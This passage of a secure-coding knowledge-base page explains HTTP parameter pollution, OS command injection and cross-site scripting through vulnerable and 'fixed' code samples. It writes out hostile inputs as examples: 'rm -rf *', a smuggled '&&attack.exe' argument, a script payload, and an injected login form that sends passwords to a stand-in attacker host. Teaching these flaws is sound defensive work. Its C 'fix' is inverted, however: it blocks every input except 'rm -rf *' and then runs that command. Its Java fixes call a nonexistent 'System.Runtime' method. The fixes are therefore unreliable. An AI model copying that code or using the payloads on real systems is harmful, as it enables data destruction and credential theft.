                <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>A malicious user may send a request like: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://frontendHost.com/page?amount=1000&amp;recipient=Mat%26action%3dwithdraw
</pre></div>
</td></tr></table>
<p>Then, the front-end will build the following back-end request: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
            <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>that is: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>action=transfer&amp;amount=1000&amp;recipient=Mat&amp;action=withdraw
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-capec">
<p>http://capec.mitre.org/data/definitions/460.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0079">OS Command Injection (CWE-78)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example1">Vulnerable Code Example1</a></li>
<li><a href="#fixed-code-example1">Fixed Code Example1</a></li>
<li><a href="#vulnerable-code-example2">Vulnerable Code Example2</a></li>
<li><a href="#fixed-code-example2">Fixed Code Example2</a><ul>
<li><a href="#fix-1-using-a-sanitizing-check">Fix 1 : Using a sanitizing check</a></li>
<li><a href="#fix-2-revise-the-untrusted-data-and-make-it-safe">Fix 2 : Revise the untrusted data and make it safe</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component. This could allow attackers to execute unexpected, dangerous commands directly on the operating system. </p>
<p>This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</p>
<p>There are at least two subtypes of OS command injection:</p>
<ol>
<li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</li>
<li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</li>
</ol>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Security issues, data leak issues, etc.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Always check the safety of user input data before storing it in memory.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example1">Vulnerable Code Example1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the vulnable code, system commands are executed by calling the system () function. An attacker can control the external input received by the scanf() function, such as passing "rm -rf *", which can cause serious security issues.</p>
<h3 id="fixed-code-example1">Fixed Code Example1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"rm -rf *"</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> 
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In the fixed code, system commands are executed by calling the system () function. The developer made a simple verification of the external input received by the scanf() function, which can prevent some system command injection problems.</p>
<h3 id="vulnerable-code-example2">Vulnerable Code Example2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>
<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>In the vulnable code, attackers can control the command line parameters for myaction.exe and they can even execute codes on the server machine without authorization by passing untrusted="&amp;&amp;attack.exe", leading to severe security issue.</p>
<h3 id="fixed-code-example2">Fixed Code Example2</h3>
<h4 id="fix-1-using-a-sanitizing-check">Fix 1 : Using a sanitizing check</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Using a sanitizing check, for example, a checking of whether the string </span>
<span class="c1">// untrusted has a substring "&amp;&amp;" </span>
<span class="k">if</span> <span class="o">(!</span><span class="n">isSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">))</span> <span class="k">return</span><span class="o">;</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">);</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h4 id="fix-2-revise-the-untrusted-data-and-make-it-safe">Fix 2 : Revise the untrusted data and make it safe</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Revise the untrusted data and make it safe </span>
<span class="n">String</span> <span class="n">trusted</span> <span class="o">=</span> <span class="n">makeSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">);</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">trusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE78">
<p>http://cwe.mitre.org/data/definitions/78.html
[^CERT-STR02-C]https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems
[^CERT-IDS07-J]https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec%28%29+method <a class="footnote-backref" href="#fnref-CWE78" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0080">XSS Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 9 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a><ul>
<li><a href="#reflected">Reflected</a></li>
<li><a href="#persistent">Persistent</a></li>
<li><a href="#dom-based">DOM-based</a></li>
</ul>
</li>
<li><a href="#vulnerability-and-risk1">Vulnerability and risk1</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#example-1">Example 1</a></li>
<li><a href="#example-2">Example 2</a></li>
</ul>
</li>
<li><a href="#potential-mitigations">Potential Mitigations</a><ul>
<li><a href="#vetted-library-or-framework1">Vetted library or framework1</a></li>
<li><a href="#contextual-output-encodingescaping-of-string-input2">Contextual output encoding/escaping of string input2</a></li>
<li><a href="#safely-validating-untrusted-html-input2">Safely validating untrusted HTML input2</a></li>
<li><a href="#separate-data-and-code1">Separate data and code1</a></li>
<li><a href="#set-the-session-cookie-to-be-httponly16">Set the session cookie to be HttpOnly16</a></li>
<li><a href="#disable-scripts2">Disable scripts2</a></li>
<li><a href="#cookie-protection2">Cookie protection2</a></li>
<li><a href="#use-static-code-analyzer">Use static code analyzer</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. XSS is mainly classified into 3 types: reflected XSS, persistent XSS and DOM-based XSS.</p>
<h3 id="reflected">Reflected</h3>
<p>The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</p>
<h3 id="persistent">Persistent</h3>
<p>The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.</p>
<h3 id="dom-based">DOM-based</h3>
<p>In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</p>
<h1 id="vulnerability-and-risk1">Vulnerability and risk<sup id="fnref-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h1>
<p>The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.</p>
<table>
<thead>
<tr>
<th>Scope</th>
<th>Impact</th>
<th>Likelihood</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access Control Confidentiality</td>
<td>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</td>
<td></td>
</tr>
<tr>
<td>Integrity Confidentiality Availability</td>
<td>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</td>
<td></td>
</tr>
<tr>
<td>Confidentiality Integrity Availability Access Control</td>
<td>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="example-1">Example 1</h3>
<p>This code displays a welcome message on a web page based on the HTTP GET <code>msg</code> parameter. This example covers a Reflected XSS scenario.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VunerableController</span> <span class="o">{</span>
  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/echo"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">echo</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"msg"</span><span class="o">)</span> <span class="n">String</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">msg</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Because the parameter can be arbitrary, the url of the page could be modified so <code>msg</code> contains scripting syntax, such as</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;</span>alert("You've been attacked!");<span class="nt">&lt;/script&gt;</span>
</pre></div>
</td></tr></table>
<p>This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.
More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"stealpassword"</span><span class="nt">&gt;</span>Please Login:<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"input"</span> <span class="na">action=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="nt">/&gt;&lt;br/&gt;</span>Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="nt">/&gt;&lt;br/&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="nt">/&gt;&lt;/form&gt;&lt;/div&gt;</span>
</pre></div>
</td></tr></table>
<p>If a user clicks on this link then <code>echo</code> handler will generate the following HTML and send it to user's browser</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"stealpassword"</span><span class="p">&gt;</span>
  Please Login:
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"input"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
    Username:
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>If a user submits this form, attackers can easily get user's password.</p>
<h3 id="example-2">Example 2</h3>
<p>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing users. It displays a Persistent XSS scenario.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">java.util.Collection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Optional</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Level</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Logger</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="kd">interface</span> <span class="nc">Row</span> <span class="o">{</span>
  <span class="n">Object</span> <span class="nf">getColumnByName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">QueryResult</span> <span class="o">{</span>
  <span class="n">Row</span> <span class="nf">fetchOne</span><span class="o">();</span>

  <span class="n">Collection</span><span class="o">&lt;</span><span class="n">Row</span><span class="o">&gt;</span> <span class="nf">fetchAll</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">SQLConnection</span> <span class="o">{</span>
  <span class="n">QueryResult</span> <span class="nf">execute</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
  <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="nf">sanitize</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
<span class="o">}</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DemoController</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> 
                       <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">DemoController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
  <span class="kd">private</span> <span class="kd">final</span> <span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">;</span>

  <span class="kd">public</span> <span class="nf">DemoController</span><span class="o">(</span><span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">=</span> <span class="n">connection</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/createuser"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">createUser</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"username"</span><span class="o">)</span> <span class="n">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">=</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">sanitize</span><span class="o">(</span>
            <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"insert into users (username) values (\"%s\")"</span><span class="o">,</span> <span class="n">username</span><span class="o">));</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isPresent</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">get</span><span class="o">());</span>
    <span class="k">return</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/listusers"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">listUsers</span><span class="o">()</span> <span class="o">{</span>
    <span class="n">QueryResult</span> <span class="n">result</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="s">"select * from users"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">content</span> <span class="o">=</span> <span class="s">"&lt;div id=userlist&gt;Users:"</span><span class="o">;</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Row</span> <span class="n">row</span> <span class="o">:</span> <span class="n">result</span><span class="o">.</span><span class="na">fetchAll</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">row</span><span class="o">.</span><span class="na">getColumnByName</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
      <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;div class=\"username\"&gt;"</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="k">return</span> <span class="n">content</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Users page. This HTML can, for example, be a password stealing Login message.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<h3 id="vetted-library-or-framework1">Vetted library or framework<sup id="fnref2-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43126">Microsoft's Anti-XSS library</a>, the <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/2.1.0.1">OWASP ESAPI</a>, and <a href="https://wicket.apache.org/">Apache Wicket</a>.</p>
<h3 id="contextual-output-encodingescaping-of-string-input2">Contextual output encoding/escaping of string input<sup id="fnref-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
